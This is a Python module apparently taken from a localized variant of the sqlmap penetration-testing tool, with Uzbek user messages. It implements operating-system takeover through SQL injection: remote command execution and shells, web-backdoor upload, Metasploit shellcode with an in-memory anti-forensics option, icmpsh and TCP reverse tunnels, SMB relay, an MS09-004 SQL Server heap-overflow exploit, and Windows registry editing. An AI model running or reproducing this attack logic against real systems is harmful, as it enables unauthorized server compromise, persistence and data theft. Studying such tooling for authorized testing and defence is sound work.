#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.uzbek import ut
import os

from lib.core.common import Backend
from lib.core.common import getSafeExString
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import openFile
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapSystemException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.request import inject
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = ("%soutput" % conf.tablePrefix)
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif Backend.isDbms(DBMS.PGSQL) and inject.getGadget():
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = 'buyruq bajarish uchun veb-backdoor ishlatiladi'
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "operatsion tizim buyruqlarini bajarib bo'lmaydi, vosita: "
            errMsg += 'serverdagi DBMS'
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif Backend.isDbms(DBMS.PGSQL) and inject.getGadget():
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "buyruq qobig'i uchun veb-backdoor ishlatiladi"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "interaktiv operatsion tizim qobig'ini "
            errMsg += "DBMS orqali ochib bo'lmaydi, chunki "
            errMsg += "stacked queries SQL-inyeksiyasi qo'llanmaydi"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()

        try:
            self.initEnv(web=web)
        except SqlmapFilePathException:
            if not web and not conf.direct:
                infoMsg = 'veb-backdoor usuliga qaytilmoqda...'
                logger.info(infoMsg)

                web = True
                kb.udfFail = True

                self.initEnv(web=web)
            else:
                raise

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = ut('how do you want to establish the tunnel?', "tunnel qanday o'rnatilsin?")
            msg += ut('\n[1] TCP: Metasploit Framework (default)', '\n[1] TCP: Metasploit Framework (standart)')
            msg += ut('\n[2] ICMP: icmpsh - ICMP tunneling', '\n[2] ICMP: icmpsh - ICMP tunneli')

            while True:
                tunnel = readInput(msg, default='1')

                if isDigit(tunnel) and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = "noto'g'ri qiymat; faqat '1' va '2' mumkin"
                    logger.warning(warnMsg)
        else:
            tunnel = 1

            debugMsg = "tunnel faqat TCP orqali o'rnatiladi, agar "
            debugMsg += "serverdagi DBMS tizimi Windows bo'lmasa"
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = 'sqlmapni administrator sifatida ishga tushiring, '
                errMsg += 'agar alohida kanal orqali ICMP tunnel '
                errMsg += "o'rnatmoqchi bo'lsangiz, chunki icmpsh xom soketlar bilan "
                errMsg += 'ICMP paketlarini tutadi va yaratadi'
                raise SqlmapMissingPrivileges(errMsg)

            try:
                __import__("impacket")
            except ImportError:
                errMsg = "sqlmapga 'python-impacket' tashqi kutubxonasi kerak, "
                errMsg += 'icmpsh bosh qismini ishlatish uchun. Yuklab olish: '
                errMsg += "https://github.com/SecureAuthCorp/impacket"
                raise SqlmapMissingDependence(errMsg)

            filename = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(filename):
                try:
                    with openFile(filename, "wb") as f:
                        f.write(b"1")
                except IOError as ex:
                    errMsg = 'faylni ochish/yozishda xato yuz berdi '
                    errMsg += "'%s' fayli uchun ('%s')" % (filename, getSafeExString(ex))
                    raise SqlmapSystemException(errMsg)
            else:
                errMsg = 'kompyuteringizda ICMP javoblarini butun tizim '
                errMsg += "bo'yicha o'chirishingiz kerak. Linux/Unix namunasi:\n"
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += 'Buni qilmasangiz, baza serveridan '
                errMsg += "ma'lumot olasiz, ammo u "
                errMsg += 'siz yuborgan buyruqlarni olmasligi mumkin'
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = ut('how do you want to execute the Metasploit shellcode ', 'Metasploit shellcode kodi qanday bajarilsin, ')
                    msg += ut('on the back-end database underlying operating system?', 'baza joylashgan operatsion tizimda?')
                    msg += ut("\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)", "\n[1] 'sys_bineval' UDF orqali (xotirada, izlarni kamaytirish, standart)")
                    msg += ut("\n[2] Via 'shellcodeexec' (file system way, preferred on 64-bit systems)", "\n[2] 'shellcodeexec' orqali (fayl tizimida, 64 bitli tizimlarda afzal)")

                    while True:
                        choice = readInput(msg, default='1')

                        if isDigit(choice) and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = "noto'g'ri qiymat; faqat '1' va '2' mumkin"
                            logger.warning(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = ut('unable to mount the operating system takeover', "operatsion tizimni boshqarishni yo'lga qo'yib bo'lmadi")
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = 'Windowsdagi MySQL odatda SYSTEM '
                    debugMsg += 'foydalanuvchisi, huquqlarni oshirish kerak emas'
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = ut('unable to mount the operating system takeover', "operatsion tizimni boshqarishni yo'lga qo'yib bo'lmadi")
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = 'tunnel uchun veb-backdoor usuliga qaytilmoqda'
            else:
                infoMsg = 'tunnel uchun veb-backdoor ishlatiladi'
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg = 'sqlmap operatsion tizim foydalanuvchisi '
                    warnMsg += "huquqlarini oshirish usullarini qo'llamaydi, agar "
                    warnMsg += "DBMS joylashgan tizim Windows bo'lmasa"
                    logger.warning(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = ut('unable to mount the operating system takeover', "operatsion tizimni boshqarishni yo'lga qo'yib bo'lmadi")
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = ut('unable to mount the operating system takeover', "operatsion tizimni boshqarishni yo'lga qo'yib bo'lmadi")
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = "alohida kanal sessiyasini ochib bo'lmadi"
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = 'serverdagi DBMS joylashgan operatsion tizim '
            errMsg += 'Windows emas: SMB relay '
            errMsg += "amalini bajarib bo'lmaydi"
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = 'bu DBMS da SMB relay '
                errMsg += 'faqat stacked queries '
                errMsg += "qo'llanganda ishlaydi"
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "stacked queries qo'llanmagani uchun, "
                debugMsg += 'sqlmap SMB relay amalini '
                debugMsg += "ko'r SQL-inyeksiya orqali bajaradi"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = "bu amal muvaffaqiyatli bo'lish ehtimoli past "

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += 'chunki Windowsdagi MySQL odatda '
            warnMsg += 'Local System nomidan ishlaydi; bu haqiqiy foydalanuvchi emas, '
            warnMsg += 'SMB xizmatiga ulanishda NTLM sessiya '
            warnMsg += 'xeshini yubormaydi'

        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += 'chunki Windowsdagi PostgreSQL odatda '
            warnMsg += 'postgres nomidan ishlaydi; bu haqiqiy tizim foydalanuvchisi, '
            warnMsg += 'ammo Administrators guruhida emas'

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += "chunki Microsoft SQL Server %s ko'pincha " % Backend.getVersion()
            warnMsg += 'Network Service nomidan ishlaydi; bu haqiqiy foydalanuvchi emas, '
            warnMsg += 'NTLM sessiya xeshini yubormaydi, '
            warnMsg += 'SMB xizmatiga ulanishda'

        else:
            printWarn = False

        if printWarn:
            logger.warning(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = 'serverdagi DBMS Microsoft SQL Server '
            errMsg += "2000 yoki 2005 bo'lishi kerak, uyum buferi "
            errMsg += "toshishidan foydalanish uchun, 'sp_replwritetovarbin' "
            errMsg += 'protsedurasida (MS09-004)'
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = 'Microsoft SQL Server %s da foydalanishga urinish: ' % Backend.getVersion()
        infoMsg += "'sp_replwritetovarbin' protsedurasidagi uyum xotirasi "
        infoMsg += 'buferi toshishi (MS09-004)'
        logger.info(infoMsg)

        msg = ut('this technique is likely to DoS the DBMS process, are you ', 'bu usul DBMS jarayonini ishdan chiqarishi mumkin; ')
        msg += ut('sure that you want to carry with the exploit? [y/N] ', 'haqiqatan davom etasizmi? [y/N] ')

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = "'uncPathRequest' metodi aniqlanishi kerak "
        errMsg += 'tegishli DBMS plagini ichida'
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = 'serverdagi DBMS joylashgan operatsion tizim '
            errMsg += 'Windows emas'
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = ut('which registry key do you want to read? [%s] ', "qaysi reyestr kaliti o'qilsin? [%s] ") % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = ut('which registry key value do you want to read? [%s] ', "reyestrning qaysi qiymati o'qilsin? [%s] ") % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "Windows reyestr yo'li o'qilmoqda: '%s\\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = 'majburiy parametr yetishmaydi'

        if not conf.regKey:
            msg = ut('which registry key do you want to write? ', 'qaysi reyestr kalitiga yozasiz? ')
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = ut('which registry key value do you want to write? ', 'qaysi reyestr kaliti qiymatiga yozasiz? ')
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = ut('which registry key value data do you want to write? ', "reyestr qiymatiga qanday ma'lumot yozasiz? ")
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = ut('which registry key value data-type is it? ', "reyestr qiymati ma'lumot turi qanday? ")
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = "Windows reyestr yo'li qo'shilmoqda: '%s\\%s' " % (regKey, regVal)
        infoMsg += "ma'lumot: '%s'. " % regData
        infoMsg += 'Bu faqat baza jarayoni foydalanuvchisida '
        infoMsg += "Windows reyestrini o'zgartirish huquqi bo'lsa ishlaydi."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = 'majburiy parametr yetishmaydi'

        if not conf.regKey:
            msg = ut('which registry key do you want to delete? ', "qaysi reyestr kaliti o'chirilsin? ")
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = ut('which registry key value do you want to delete? ', "reyestrning qaysi qiymati o'chirilsin? ")
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = ut('are you sure that you want to delete the Windows ', "Windows reyestridagi yo'lni haqiqatan ")
        message += ut("registry path '%s\\%s? [y/N] ", "o'chirasizmi: '%s\\%s? [y/N] ") % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = "Windows reyestr yo'li o'chirilmoqda: '%s\\%s'. " % (regKey, regVal)
        infoMsg += 'Bu faqat baza jarayoni foydalanuvchisida '
        infoMsg += "Windows reyestrini o'zgartirish huquqi bo'lsa ishlaydi."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
